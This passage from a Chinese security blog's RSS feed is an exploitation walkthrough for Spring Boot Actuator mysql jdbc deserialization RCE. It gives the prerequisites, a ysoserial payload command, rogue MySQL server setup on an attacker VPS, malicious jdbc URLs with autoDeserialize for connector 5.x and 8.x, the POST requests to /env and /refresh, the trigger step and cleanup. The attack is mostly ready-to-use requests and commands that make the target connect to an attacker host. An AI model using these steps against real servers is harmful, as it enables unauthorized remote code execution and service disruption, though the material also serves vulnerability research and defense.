&lt;h3 id=&quot;0x08mysql-jdbc-deserialization-rce&quot;&gt;0x08：mysql jdbc deserialization RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-11&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
  &lt;li&gt;目标环境中存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql-connector-java&lt;/code&gt; 依赖&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-11&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一查看环境依赖&quot;&gt;步骤一：查看环境依赖&lt;/h5&gt;

&lt;p&gt;GET 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt;，搜索环境变量（classpath）中是否有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql-connector-java&lt;/code&gt;  关键词，并记录下其版本号（5.x 或 8.x）；&lt;/p&gt;

&lt;p&gt;搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;commons-collections&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jdk7u21&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jdk8u20&lt;/code&gt; 等；&lt;/p&gt;

&lt;p&gt;搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.datasource.url&lt;/code&gt; 关键词，记录下其 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt;  值，方便后续恢复其正常 jdbc url 值。&lt;/p&gt;

&lt;h5 id=&quot;步骤二架设恶意-rogue-mysql-server&quot;&gt;步骤二：架设恶意 rogue mysql server&lt;/h5&gt;

&lt;p&gt;在自己控制的服务器上运行 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py&quot;&gt;springboot-jdbc-deserialization-rce.py&lt;/a&gt; 脚本，并使用 &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt; 自定义要执行的命令：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ysoserial.jar CommonsCollections3 calc &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.ser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在脚本&lt;strong&gt;同目录下&lt;/strong&gt;生成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.ser&lt;/code&gt; 反序列化 payload 文件，供脚本使用。&lt;/p&gt;

&lt;h5 id=&quot;步骤三设置-springdatasourceurl-属性&quot;&gt;步骤三：设置 spring.datasource.url 属性&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;mysql-connector-java 5.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;mysql-connector-java 8.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤四刷新配置-1&quot;&gt;步骤四：刷新配置&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
Content-Type: application/x-www-form-urlencoded

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
Content-Type: application/json

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤五触发数据库查询&quot;&gt;步骤五：触发数据库查询&lt;/h5&gt;

&lt;p&gt;尝试访问网站已知的数据库查询的接口，例如： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/product/list&lt;/code&gt; ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发&lt;/p&gt;

&lt;h5 id=&quot;步骤六恢复正常-jdbc-url&quot;&gt;步骤六：恢复正常 jdbc url&lt;/h5&gt;

&lt;p&gt;反序列化漏洞利用完成后，使用 &lt;strong&gt;步骤三&lt;/strong&gt; 的方法恢复 &lt;strong&gt;步骤一&lt;/strong&gt; 中记录的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.datasource.url&lt;/code&gt; 的原始 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; 值&lt;/p&gt;

&lt;h4 id=&quot;漏洞原理-6&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址&lt;/li&gt;
  &lt;li&gt;refresh 刷新后设置了一个新的 spring.datasource.url 属性值&lt;/li&gt;
  &lt;li&gt;当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接&lt;/li&gt;
  &lt;li&gt;然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据&lt;/li&gt;
  &lt;li&gt;目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析-7&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf&quot;&gt;New-Exploit-Technique-In-Java-Deserialization-Attack&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-7&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce&quot;&gt;repository/springboot-mysql-jdbc-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9097/actuator/env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;发送完 payload 后触发漏洞：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9097/product/list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Fri, 25 Sep 2020 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2020/Spring-boot/</link>
        <guid isPermaLink="true">/blog/2020/Spring-boot/</guid>
        
        
        <category>blog</category>
        
        <category>src</category>
        
        <category>CVE</category>
        
        <category>信息搜集</category>
        
        <category>笔记</category>
        
      </item>
    
  </channel>
</rss>
